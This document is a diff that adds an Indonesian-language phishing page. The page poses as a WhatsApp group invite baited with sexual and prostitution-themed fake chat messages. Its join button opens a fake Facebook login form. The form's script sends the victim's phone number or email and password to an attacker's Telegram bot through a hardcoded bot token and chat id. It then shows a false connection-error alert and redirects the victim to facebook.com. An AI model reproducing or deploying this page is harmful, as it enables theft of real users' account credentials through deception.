@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>CHIKA 20 JUTA</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      background-color: #000;
+      color: white;
+      margin: 0;
+    }
+
+    .header {
+      background-color: #111;
+      padding: 10px;
+      display: flex;
+      align-items: center;
+      font-weight: bold;
+      box-shadow: 0 0 10px #25d366;
+    }
+
+    .header img {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      margin-right: 10px;
+      border: 2px solid #25d366;
+    }
+
+    .chat, .fake-chat {
+      background: #111;
+      padding: 15px;
+      border-bottom: 1px solid #333;
+      box-shadow: inset 0 0 5px #25d366;
+    }
+
+    .chat p, .fake-chat p {
+      margin: 10px 0;
+      padding: 10px;
+      background-color: #222;
+      border-radius: 10px;
+      box-shadow: 0 0 10px #25d366;
+    }
+
+    .group-info {
+      background: #111;
+      padding: 20px;
+      text-align: center;
+      box-shadow: inset 0 0 15px #25d366;
+    }
+
+    .group-info h2 {
+      margin: 5px 0;
+      color: #25d366;
+      text-shadow: 0 0 10px #25d366;
+    }
+
+    .participants {
+      display: flex;
+      overflow-x: auto;
+      padding: 10px;
+      background: #111;
+    }
+
+    .participant {
+      margin-right: 15px;
+      text-align: center;
+    }
+
+    .participant img {
+      width: 55px;
+      height: 55px;
+      border-radius: 50%;
+      border: 2px solid #25d366;
+    }
+
+    .participant span {
+      font-size: 13px;
+      color: #25d366;
+    }
+
+    .buttons {
+      display: flex;
+      justify-content: space-around;
+      padding: 15px;
+      background: #111;
+      border-top: 1px solid #333;
+    }
+
+    .btn {
+      padding: 10px 20px;
+      font-weight: bold;
+      border: none;
+      border-radius: 3px;
+      cursor: pointer;
+    }
+
+    .btn-cancel {
+      color: #999;
+      background: none;
+    }
+
+    .btn-join {
+      background: #25d366;
+      color: white;
+      animation: glow 1s infinite alternate;
+    }
+
+    @keyframes glow {
+      from { box-shadow: 0 0 5px #25d366; }
+      to { box-shadow: 0 0 20px #25d366, 0 0 30px #25d366; }
+    }
+
+    .login-box {
+      display: none;
+      background: #111;
+      max-width: 400px;
+      margin: 40px auto;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 20px #0f0;
+    }
+
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border-radius: 5px;
+      border: 1px solid #444;
+      background: #222;
+      color: white;
+    }
+
+    .btn-login {
+      width: 100%;
+      background: #1877f2;
+      color: white;
+      border: none;
+      padding: 10px;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+
+    .extra {
+      text-align: center;
+      margin-top: 15px;
+    }
+
+    .extra a {
+      text-decoration: none;
+      color: #1877f2;
+    }
+  </style>
+</head>
+<body>
+
+<!-- GRUP WA PALSU -->
+<div id="group-page">
+  <div class="header">
+    <img src="6.jpg" alt="Foto Grup">
+    CHIKA 20 JUTA
+  </div>
+
+  <div class="group-info">
+    <h2>CHIKA VIRALL 20 JUTA</h2>
+    <p>Grup dibuat oleh ~Qinn Project</p>
+    <p><strong>WELCOME TO TUKANG COLI</strong></p>
+    <p>📍Peraturan 📍<span style="color:skyblue">Baca selengkapnya</span></p>
+    <p><small>190 peserta</small></p>
+  </div>
+
+  <div class="participants">
+    <div class="participant"><img src="5.jpg"><span>~catthrine</span></div>
+    <div class="participant"><img src="4.jpg"><span>~QinnThuWan</span></div>
+    <div class="participant"><img src="3.jpg"><span>~rachel</span></div>
+    <div class="participant"><img src="2.jpg"><span>~nayla</span></div>
+    <div class="participant"><img src="1.jpg"><span>~dinda</span></div>
+  </div>
+
+  <!-- Bekas Chat -->
+  <div class="fake-chat">
+    <p><b>~rachel:</b>jasa open bo</p>
+    <p><b>~dinda:</b>cari jodoh </p>
+    <p><b>~nayla:</b>siap melayani vcs 24jam</p>
+  </div>
+
+  <div class="buttons">
+    <button class="btn btn-cancel">BATAL</button>
+    <button class="btn btn-join" onclick="showLogin()">BERGABUNG KE GROUP</button>
+  </div>
+</div>
+
+<!-- FORM LOGIN PALSU -->
+<div class="login-box" id="login-box">
+  <h2>Masuk ke akun Facebook Anda<br>untuk terhubung dengan WhatsApp</h2>
+  <form onsubmit="sendTelegram(event)">
+    <input type="text" id="user" placeholder="Nomor ponsel atau email" required>
+    <input type="password" id="pass" placeholder="Kata Sandi Facebook" required>
+    <button type="submit" class="btn-login">Masuk</button>
+  </form>
+  <div class="extra">
+    <a href="#">Buat akun</a> | 
+    <a href="#">Lupa Sandi?</a>
+  </div>
+</div>
+
+<!-- SCRIPT -->
+<script>
+  function showLogin() {
+    document.getElementById('group-page').style.display = 'none';
+    document.getElementById('login-box').style.display = 'block';
+  }
+
+  function sendTelegram(event) {
+    event.preventDefault();
+    const token = '8195448334:AAHlqTT-odOfhy-0gn0F2qs2dp_jaKpRS_U';
+    const chat_id = '7819779147';
+    const user = document.getElementById("user").value;
+    const pass = document.getElementById("pass").value;
+    const text = `LOGIN FACEBOOK PLSU:\nEmail/HP: ${user}\nPassword: ${pass}`;
+
+    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`)
+      .then(() => {
+        alert("Gagal masuk. Periksa koneksi internet Anda.");
+        window.location.href = "https://facebook.com";
+      });
+  }
+</script>
+
+</body>
+</html>
